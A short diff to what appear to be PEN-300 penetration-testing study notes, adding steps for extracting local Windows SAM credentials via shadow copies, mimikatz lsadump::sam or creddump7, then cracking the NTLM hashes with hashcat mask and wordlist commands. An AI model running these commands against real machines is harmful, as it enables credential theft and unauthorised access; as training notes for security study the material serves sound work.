@@ -1,6 +1,6 @@
-## PEN-300
+# PEN-300
 
-
+### Local Windows Credentials
 
 ##### SAM credentials
 
@@ -30,7 +30,10 @@ $env:computername
 2) Locate Shadow copy:          vssadmin list shadows
 3) Copy SYSTEM / SAM off of host  
 4) mimikatz lsadump::sam /system:systemfile /sam:samfile  
-5) Hashcat the password:  
+   OR
+   creddump7: python pwdump.py ~/data/sam/system ~/data/sam/sam  
+   <br>
+6) Hashcat the password:  
 
 **Mask attack** ./hashcat64.bin -m 1000 -a 3 -w 3 -O hash.txt -1 ?l?d ?1?1?1?1?1?1?1?1?1 -i --increment-min=5
 **Password List** .\hashcat.exe -m 1000 -a 0 -w 3 -O hash.txt password_list.txt
